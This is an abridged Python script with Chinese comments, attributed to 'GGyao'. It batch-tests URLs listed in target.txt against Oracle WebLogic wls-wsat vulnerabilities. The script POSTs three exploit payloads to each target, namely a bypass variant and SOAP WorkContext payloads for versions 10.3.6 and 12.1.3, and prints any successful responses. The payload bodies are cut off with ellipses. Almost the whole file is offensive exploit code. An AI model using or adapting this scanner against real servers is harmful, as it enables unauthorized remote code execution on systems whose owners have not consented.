#coding=utf-8
#针对wls-wsat组件的漏洞，使用三个exp进行批量检测。
#用法：python xxx.py (将需要测试的URL放到target.txt中。)
#by GGyao
...
wls_xml_bypass = """<?xml version="1.0" encoding="utf-8"?>
...
wls_xml_1036="""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">      
...
def main(target):
	...
	try:
		...
		if bypass_1.status_code == 200:
			print (url + " >> wls_bypass:" + bypass_1.text.strip())	
		else:
			pass


		#wls_payload_10.3.6
		wls_1036 = requests.post(url,data = wls_xml_1036, headers = headers_wls_1036,timeout = 20, verify = False)
		if wls_1036.status_code == 200:
			print (url + " >> wls_10.3.6:" + wls_1036.text.strip())
		else:
			pass

			#wls_payload_12.1.3
		wls_1213 = requests.post(url,data = wls_xml_1213, headers = headers_wls_1213,timeout = 20, verify = False)
		if wls_1213.status_code == 200:
			print (url + " >> wls_12.1.3:" + wls_1213.text.strip())
		else:
			pass
